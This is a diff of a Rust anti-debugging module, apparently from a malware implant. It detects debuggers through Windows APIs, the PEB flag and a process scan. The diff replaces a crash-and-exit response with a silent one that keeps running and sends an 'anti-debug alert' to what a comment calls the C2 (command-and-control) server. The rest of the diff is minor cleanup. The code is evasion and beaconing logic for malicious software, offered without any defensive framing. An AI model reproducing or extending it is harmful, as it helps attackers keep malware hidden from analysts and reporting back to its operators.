@@ -12,9 +12,8 @@ pub fn debug_log(message: &str) {
 mod windows {
     use super::debug_log;
     use winapi::um::{
-        debugapi,
         debugapi::{CheckRemoteDebuggerPresent, IsDebuggerPresent},
-        processthreadsapi, winnt,
+        processthreadsapi,
     };
 
     pub fn is_debugger_present() -> bool {
@@ -63,16 +62,16 @@ mod windows {
             #[repr(C)]
             struct PEB {
                 _pad: [u8; 2],
-                BeingDebugged: u8,
+                being_debugged: u8,
                 _pad2: [u8; 1],
             }
             let peb_ptr = pbi.PebBaseAddress as *const PEB;
             let result = if !peb_ptr.is_null() {
-                (*peb_ptr).BeingDebugged != 0
+                (*peb_ptr).being_debugged != 0
             } else {
                 false
             };
-            debug_log(&format!("Windows::PEB::BeingDebugged = {}", result));
+            debug_log(&format!("Windows::PEB::being_debugged = {}", result));
             result
         }
     }
@@ -216,26 +215,16 @@ fn detect_debugger_processes() -> bool {
     detected
 }
 
+#[allow(dead_code)]
 pub fn anti_debug_response() {
     debug_log("Lancement de la vérification anti-débogage");
 
     if detect_debugging() {
-        debug_log("Débogueur détecté! Lancement des contre-mesures...");
-
-        #[cfg(target_os = "windows")]
-        unsafe {
-            debug_log("Windows: Appel à DebugBreak()");
-            winapi::um::debugapi::DebugBreak();
-        }
-
-        #[cfg(target_os = "linux")]
-        unsafe {
-            debug_log("Linux: Envoi de SIGTRAP");
-            libc::raise(libc::SIGTRAP);
-        }
-
-        debug_log("Sortie avec code d'erreur spécial (0xDEADBEEF)");
-        process::exit(0xDEADBEEFu32 as i32);
+        debug_log("Débogueur détecté! (mais le programme continue)");
+        // Envoi d'une alerte au C2
+        tokio::spawn(async {
+            let _ = crate::connexion::send_anti_debug_alert().await;
+        });
     } else {
         debug_log("Aucun débogueur détecté");
     }
